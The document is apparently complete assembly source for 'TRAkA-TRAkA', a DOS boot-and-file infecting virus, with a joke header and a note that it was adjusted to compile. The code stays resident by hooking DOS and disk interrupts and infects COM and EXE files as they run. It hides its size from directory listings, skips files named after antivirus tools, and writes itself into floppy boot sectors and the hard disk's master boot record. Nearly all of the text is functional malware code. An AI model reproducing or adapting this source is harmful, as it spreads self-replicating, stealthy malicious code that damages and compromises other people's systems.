;
;       MODIFIED TO COMPILE ON ENGLISH VERSION OF TASM
;               see trkatrka.org for original source
;
; The name 'traka-traka' comes from a joke very good known here in Argentina...
;
; The Joke
;
;  Once upon a time there was a woman who spent all the money given from her 
;   husband buying stupid things..
;  One morning while she was shoppin' saw a little animal at a pets shop and
;   she bought it.
;  That night when her husband arrived at home the woman showed him that
;   little animal sayin'..
;    - 'Honey! this mornin' I butgh this beautiful animal called traka-traka...
;       it can eat anything...
;       see! traka-traka that table!' and the little animal started to eat the
;       table... 'traka-traka the tv..' and the little animal started to eat
;        the tv...
;
;  Her husband was very angry and said 'I'm tired of your your stupid things! 
;  I'm not workin'so hard for nuthing stop buyin' that stupid things..'
;
;  - 'but darlin' it's a beautiful animal.. see! traka-traja the newspaper'
;       and the animal started to eat the newspaper'
;
;  So the man said 'traka-traka??? traka-traka MY BALLS!! >:-\ '



code segment para public
assume cs:code, ss:code

LarVir   = (FinVir - ComVir)                       
VirMem   = (FinVirMem - ComVir)                    
pushval  = 6Ah
pushvals = 68h
yo = 'A!'
id = 'TT'

ComVir label byte
    push bp
    push ax
    push bx
    push cx
    push di
    push si
    
    call entry  
entry:
    pop bp
    sub bp,offset entry    
    mov ax,offset res
    add ax,bp
    call ax
    mov si,103h
    lodsw
    cmp ax,id
    jne de_exe
    mov di,100h
    mov si,offset com_buf
    add si,bp
    movsw
    movsw
    movsb

de_com:
    pop si
    pop di
    pop cx
    pop bx
    pop ax
    pop bp
    push bx
    push bx
    mov bx,sp
    mov word ptr [bx+2],100h
    pop bx
    ret

com_buf dw 9090h,9090h
        db 90h

de_exe:
    push ds
    push es

    lea si,retorno+2
    add si,bp
    mov di,si
    
    push bp
    
    mov bp,ds
    add bp,10h

    push cs
    push cs
    pop es
    pop ds
    
    lodsw
    add ax,bp
    stosw

    lodsw
    add ax,bp
    stosw

    pop bp
    
    pop es
    pop ds

    pop si
    pop di
    pop cx
    pop bx
    pop ax
    pop ax

    cli
    mov ss,word ptr cs:stacke + bp
    mov sp,word ptr cs:stacke + 2 + bp
    sti
    
    mov bp,ax
    xor ax,ax
    
db 0EAh
retorno dw offset Host,0
stacke dw 0,offset FinVir+100h

res:
    mov bx,id
    mov ah,0A7h
    int 13h
    cmp bx,yo
    jz Yasta

    push ds
    push es
    
    mov ax,ds
    dec ax
    mov es,ax
    mov ax,es:[3]
    sub ax,(VirMem / 16) + 2
    xchg bx,ax
    mov ah,4Ah
    push ds
    pop es
    int 21h

    mov ah,48h
    mov bx,(VirMem / 16) + 1
    int 21h
    jc no_mem

    dec ax
    mov es,ax
    mov word ptr es:[0001],0008

    inc ax
    mov es,ax
    xor di,di
    mov si,di
    add si,bp
    push cs
    pop ds
    mov cx,LarVir
    rep movsb
    nop

    mov cx,offset Nueva_int21
    mov si,21h*4
    mov di,offset Int21
    call hook_int
    
    mov cx,offset Nueva_int13
    mov si,13h*4
    mov di,offset Int13
    call hook_int

    push cs                  ; traka-trak el risquido
    mov cx,offset meto_ria
    add cx,bp
    push cx
    
    push es
    mov cx,offset memo_ria
    push cx
    retf
    
meto_ria:    
    
no_mem:
    pop es
    pop ds

Yasta:    
    ret
    
hook_int:
    push ds
    push es
    cli
    xor ax,ax
    mov ds,ax
    xchg ax,cx
    xchg ax,[si]
    stosw
    mov ax,es
    xchg [si+2],ax
    stosw
    sti
    pop es
    pop ds
    ret    

memo_ria:
    call HD
    retf

;se¤al db '[TRAkA-TRAkA]'
iname db '[TRAkA-TRAkA]'

Nueva_int21:
    cmp ah,30h
    jz aca_stoy
    cmp ah,11h
    jz FCB
    cmp ah,12h
    jz FCB
    cmp ah,4Eh
    jz Handle
    cmp ah,4Fh
    jz Handle
    cmp ax,4B00h
    jne salida21
    jmp InfeXt

salida21:
    db 0EAh
Int21 dw 0,0

aca_stoy:
    cmp bx,id
    jne salida21
    mov bx,yo
    retf 0002

FCB:
    pushf
    call dword ptr cs:Int21
    or al,al
    jnz salida_FCB
    push ax
    push bx
    push es
    mov ah,2Fh
    int 21h
    cmp byte ptr es:[bx],0FFh
    jne short_FCB
    add bx,7

short_FCB:
    mov ax,es:[bx+17h]
    and al,1Fh
    xor al,00001010b
    cmp al,1Fh
    jne como_va
    sub word ptr es:[bx+1Dh],LarVir
    sbb word ptr es:[bx+1Fh],0

como_va:
    pop es
    pop bx
    pop ax

salida_FCB:
    iret

Handle:
    pushf
    call dword ptr cs:Int21
    jc me_voy
    push ax
    push bx
    push es
    mov ah,2Fh
    int 21h
    mov ax,es:[bx+16h]
    and al,1Fh
    xor al,00001010b
    cmp al,1Fh
    jne como_va2
    sub word ptr es:[bx+1Ah],LarVir
    sbb word ptr es:[bx+1Ch],0

como_va2:
    pop es
    pop bx
    pop ax

me_voy:
    mov cs:Hnd_buf,ax
    cli
    sub sp,2
    pop ax
    add sp,6
    push ax
    sub sp,4
    sti
    mov ax,cs:Hnd_buf
    iret
    
chk_names:
    pushf
    push es di 
    push ds
    pop es
    mov al,'.'
    mov di,dx
no_es:
    cld
busco1:    
    scasb
    jne busco1
    std
    mov al,'\'
busco2:
    scasb
    jne busco2
    inc di
    inc di
    mov ax,[di]
    
    cmp ax,'BT'  ;TB's
    je no_way
    cmp ax,'CS'  ;scan
    je no_way
    cmp ax,'-F'  ;f-prot
    je no_way
    cmp ax,'LC'  ;clean
    je no_way
    cmp ax,'DN'  ;ndos
    je no_way
    cmp ax,'OC'  ;command
    je no_way
    cmp ax,'D4'  ;4dos
    je no_way
    cmp ax,'SV'  ;Vsafe & Vshied
    je no_way
    
exit_chk_n:    
    pop di es
    popf
    ret
    
no_way:    
    pop di es
    popf
    pop ax
    jmp get_lozt
    
InfeXt:
    push ds
    push dx

    pushf
    call dword ptr cs:Int21
    push bp
    mov bp,sp
    push ax
    pushf
    push bx
    push cx
    push dx
    push ds

    lds dx,[bp+2]

    call chk_names
    
    mov ax,3D02h
    int 21h
    xchg ax,bx
    push bx
    
    mov ax,3524h
    int 21h
    mov cs:Old_24,bx
    mov cs:Old_24+2,es

    mov ax,2524h
    mov dx,offset Nueva_int24
    push cs
    pop ds
    int 21h

    pop bx
    mov ax,5700h
    int 21h
    mov cs:[hora],cx
    mov cs:[dia],dx
    mov al,cl
    and al,1Fh
    xor al,00001010b
    cmp al,1Fh
    je me_fijo_igual
    or cl,1Fh
    xor cl,00001010b
    mov cs:[hora],cx
    
me_fijo_igual:        
    mov ah,3Fh
    mov cx,18h
    push cs
    push cs
    pop ds
    pop es
    mov dx,offset ExeHeader
    int 21h

    mov si,dx
    lodsw
    cmp ax,'MZ'
    je que_raro
    cmp ax,'ZM'
    jne NoEsExe
que_raro:    
    add si,10h
    lodsw
    cmp ax,id
    jne No_t_exe
    jmp chau

NoEsExe:
    inc si
    lodsw
    cmp ax,id
    jne No_t_com
    jmp chau

No_t_com:
    sub si,5
    mov di, offset com_buf
    movsw
    movsw
    movsb

    mov al,02h
    call ir_a_la

    dec ax
    dec ax
    dec ax
    mov cs:saltox,ax

    call me_malengancho
    jnc sigo_com
    jmp chau

sigo_com:
    mov al,0
    call ir_a_la

    mov ah,40h
    mov cx,5
    mov dx,offset nuevo_head
    int 21h
    
    jmp termino

No_t_exe:
    mov di,offset retorno
    movsw
    movsw

    mov si,offset ExeHeader+0Eh
    movsw
    movsw

    mov di,offset ExeHeader+12h
    mov ax, id
    stosw

    mov al,02h
    call ir_a_la
    
    push ax                     ; chequeo overlays
    push dx
    mov cx,512
    mov ax,word ptr ds:ExeHeader+4
    mul cx
    pop bp
    pop cx
    cmp ax,cx
    jb chau
    cmp dx,bp
    jb chau

    push cx
    and cx,0Fh
    mov word ptr ds:ExeHeader+14h,cx
    pop ax
    
    mov dx,bp
    
    mov cl, 4
    shr ax, cl
    mov cl, 12
    shl dx, cl
    add dx, ax
    sub dx, word ptr ds:ExeHeader+8
    push dx

    call me_malengancho
    jc chau

    pop dx
    mov word ptr ds:ExeHeader+16h,dx
    inc dx
    mov word ptr ds:ExeHeader+0Eh,dx
    mov word ptr ds:ExeHeader+10h,((LarVir+100h+1)/2)*2

    mov al, 02h   ; total
    call ir_a_la

    mov cx, 512
    div cx
    inc ax
    mov word ptr ds:ExeHeader+2, dx
    mov word ptr ds:ExeHeader+4, ax
    
    add word ptr ds:ExeHeader+0Ah,((LarVir + 15) SHR 4)+16

    mov al,0
    call ir_a_la

    mov ah, 40h
    mov cx, 18h
    mov dx, offset ExeHeader
    int 21h
    
termino:
    mov ax,5701h
    db 0B9h                  ;mov cx,hora
hora dw 0
    db 0BAh                  ; mov dx,dia
dia  dw 0
    int 21h

chau:
    mov ah,3Eh
    int 21h

    mov ax,2524h
    lds dx,dword ptr cs:Old_24
    int 21h

get_lozt:
    pop ds
    pop dx
    pop cx
    pop bx

    pop ax    
    mov bp, sp
    mov [bp+12],ax

    pop ax
    pop bp
    add sp,4
    retf 0002

ir_a_la:
    mov ah,42h
    cwd
    xor cx,cx
    int 21h
    ret

me_malengancho:
    mov ah,40h
    mov cx,LarVir
    cwd
    int 21h
    ret

nuevo_head:
       db 0E9h
saltox dw 0
       dw id

Nueva_int24:
    mov al,3
    iret

Old_24 dw 0,0
       
re_boot:
    jmp short boot_nuevo
    db 90h
    dw id

boot_nuevo:
    xor ax,ax
    mov ds,ax
    cli
    mov ss,ax
    mov sp,7C00h
    sti
    push 40h
    pop ds
    mov ax,ds:[13h]
    dec ax
    dec ax
    dec ax
    mov ds:[13h],ax
    mov cl,6
    shl ax,cl
    mov es,ax
    push es
    mov si,3
devuelta:
    mov ah,0
    mov dl,0
    int 13h
    xor bx,bx
    mov ax,0204h
    db 0B9h                             ;mov cx,4F0Ch
sec_tr dw 0h
    db 0BAh                             ;mov dx,100h
drv_hd dw 100h
    int 13h
    jnc sigo2
    dec si
    jne devuelta
sigo2:
    mov ax,offset sigo_al_boot
    push ax
    retf
Larboot = $ - offset re_boot

sigo_al_boot:
    mov bx,id
    mov ah,0A7h
    int 13h
    cmp bx,yo
    jz Yasta2
    
    mov cx,offset Nueva_int13
    mov si,13h*4
    mov di,offset Int13
    push cs
    pop es
    call hook_int
    
Yasta2:    
    db pushval, 0
    pop es
    push es
    mov si,offset boot_buf
    mov di,7C00h
    push di
    push cs
    pop ds
    mov cx,512
    repz movsb
    
    call HD             ;TRAkA-TRAkA el Disco Duro
    
    retf

Nueva_int13:
    cmp ah,0A7h
    jnz sigue_todo
    cmp bx,id
    je boludo
    jmp sale13
boludo:    
    mov bx,yo
    iret

sigue_todo:
    push ax
    push bx
    push cx
    push di
    push si
    push ds
    push es
    
    cmp ah,02
    jb chk21_1
    cmp ah,04
    jnb chk21_1
    or dl,dl
    jnz stealth_duro
    push 40h
    pop ds
    mov al,ds:[3Fh]
    test al,1
    jnz salida13
    call infeXt13
    jmp short salida13
    
stealth_duro:    
    cmp dx,80h
    jne salida13
    cmp cx,1
    jne salida13
    push ax
    push cx
    mov al,1
    mov cl,15               ;ax 0202h -> 0201h
    call int13real          ;cx 0001h -> 0002h
    pop cx                  ;dx 0080h -> 0080h
    pop ax
    dec al
    cmp al,0
    je me_lo_creo
    inc cl
    add bx,200h
    call int13real
    sub bx,200h
    dec cl
    
me_lo_creo:
    pop es
    pop ds
    pop si
    pop di
    pop cx
    pop bx
    pop ax

    inc al
    xor ah,ah
    clc
    iret
    
chk21_1:    
    xor ax,ax
    mov ds,ax
    mov si,21h*4
    lodsw
    or ax,ax
    jz salida13 
    lodsw
    or ax,ax
    jz salida13 
    
chk21_2: 
    mov bx,id
    mov ah,30h
    int 21h
    cmp bx,yo
    je salida13
    
colgome:    
    mov cx,offset Nueva_int21
    mov si,21h*4
    mov di,offset Int21
    push cs
    pop es
    call hook_int
    
salida13:   
    pop es
    pop ds
    pop si
    pop di
    pop cx
    pop bx
    pop ax

sale13:    
    db 0EAh
Int13 dw 0,0       

infeXt13:
    push bx cx dx di si es 
    mov si,3
otro1:    
    mov ah,0
    int 13h
    xor dx,dx
    call leer_uno
    jnc yeah
    dec si
    jz exit
    jmp otro1
yeah:    
    mov ax,word ptr cs:boot_buf+3
    cmp ax,id
    je exit

hacelo:
    call calcula_floppy   ;<- calcular sector
    mov cs:sec_tr,cx
    mov dx,100h
    mov cs:drv_hd,dx
    xor bx,bx
    mov al,4
    call poner_uno2
    jc exit
    push cs
    pop ds
    mov cx,Larboot
    mov di,offset re_boot
    mov si,offset boot_buf
    lodsb
    cmp al,0EBh
    jne ponerlo
    xor ax,ax
    lodsb
    inc si
    mov [si],id
    add si,ax
    add di,5

ponerlo:
    dec si
    xchg di,si
    rep movsb
    mov ah,0
    mov dl,0
    int 13h
    jc exit
    xor dh,dh
    call poner_uno
    jc exit

exit:
    pop es si di dx cx bx 
    ret
    
leer_uno:    
    push cs
    pop es
    xor cx,cx
    inc cx
    mov ax,0201h
    mov bx,offset boot_buf
int13real:    
    pushf
    call dword ptr cs:Int13      ;int 13h    
    ret

poner_uno:    
    mov bx,offset boot_buf
    xor cx,cx
    inc cx
    mov al,1
poner_uno2:    
    mov ah,3
    push cs
    pop es
    call int13real
    ret
    
calcula_floppy:
    mov ax,word ptr cs:boot_buf + 13h                   
    cwd
    mov cx,word ptr cs:boot_buf + 18h
    push cx
    div cx
    mov cx,word ptr cs:boot_buf + 1Ah
    div cx
    dec ax
    xchg ah,al
    pop cx
    mov ch,ah
    sub cx,3
    ret
    
HD:    
    push ax bx cx dx di si
    mov dx,80h
    call leer_uno
    jc exit_hd
    mov ax,word ptr cs:boot_buf+3
    cmp ax,id
    je exit_hd
    mov cl,12
    xor bx,bx
    mov al,4
    call poner_uno2
    mov cs:sec_tr,cx
    mov cs:drv_hd,0080h
    mov di,offset boot_buf
    mov si,offset re_boot
    push cs
    pop ds
    mov cx,LarBoot
    rep movsb
    call poner_uno
exit_hd:    
    
    pop si di dx cx bx ax
    ret
    
    db '[Dedicado eternamente a YANiL]'
FinVir label byte

Cuenta2 label byte
rellenito db (1023 - (Cuenta2 - ComVir))+ 513 dup ('A')

boot_buf  db 128 dup('BooT')

Hnd_buf dw 0

ExeHeader db 10h DUP('TT')

FinVirMem label byte

Host:
    mov ah, 09h
    mov dx, offset TeXto
    push cs
    pop ds
    int 21h
    mov ax, 4C00h
    int 21h

TeXto db "-", 13, 10,'$'

code ends
end
